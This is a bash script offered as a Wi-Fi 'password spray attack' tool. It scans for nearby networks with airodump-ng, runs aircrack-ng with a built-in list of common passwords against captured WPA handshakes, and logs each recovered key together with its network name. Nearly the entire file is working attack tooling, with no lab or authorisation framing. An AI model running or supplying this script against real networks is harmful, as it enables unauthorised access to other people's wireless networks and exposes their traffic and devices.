#!/bin/bash
# password_spray.sh - Test common passwords against discovered networks

INTERFACE=${1:-wlan1mon}
WORDLIST=${2:-~/wordlists/common_passwords.txt}
OUTPUT_DIR=~/captures/wpa

usage() {
    echo "Usage: $0 <interface> [wordlist]"
    exit 1
}

if [ "$#" -lt 1 ]; then
    usage
fi

# Create common passwords if doesn't exist
if [ ! -f "$WORDLIST" ]; then
    cat > "$WORDLIST" <<EOF
password
12345678
password123
admin
qwerty
letmein
welcome
monkey
1234567890
password1
EOF
fi

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULTS="${OUTPUT_DIR}/spray_${TIMESTAMP}_results.txt"

echo "[*] WiFi Password Spray Attack"
echo "[*] Interface: $INTERFACE"
echo "[*] Wordlist: $WORDLIST ($(wc -l < "$WORDLIST") passwords)"
echo "[*] Results: $RESULTS"

# Scan for networks
echo "[*] Scanning for networks..."
SCAN_FILE="/tmp/scan_${TIMESTAMP}.csv"
sudo timeout 30 airodump-ng "$INTERFACE" -w "/tmp/scan_${TIMESTAMP}" --output-format csv

# Parse networks
echo "[*] Found networks:"
tail -n +2 "$SCAN_FILE" | grep -v "Station MAC" | awk -F',' '{if($1 != "") print $1 "\t" $14}' | head -20

# For each WPA network with captures
echo "[*] Testing passwords against captured handshakes..."

for CAP_FILE in "$OUTPUT_DIR"/*.cap; do
    if [ -f "$CAP_FILE" ]; then
        echo "[*] Testing: $(basename "$CAP_FILE")"
        
        # Try dictionary attack
        RESULT=$(aircrack-ng -w "$WORDLIST" "$CAP_FILE" 2>&1)
        
        if echo "$RESULT" | grep -q "KEY FOUND"; then
            PASSWORD=$(echo "$RESULT" | grep "KEY FOUND" | awk -F'[ []' '{print $4}')
            ESSID=$(echo "$RESULT" | grep "ESSID" | awk -F': ' '{print $2}')
            
            echo "[+] SUCCESS! Network: $ESSID, Password: $PASSWORD" | tee -a "$RESULTS"
        fi
    fi
done

echo "[*] Password spray complete"
echo "[*] Results saved to: $RESULTS"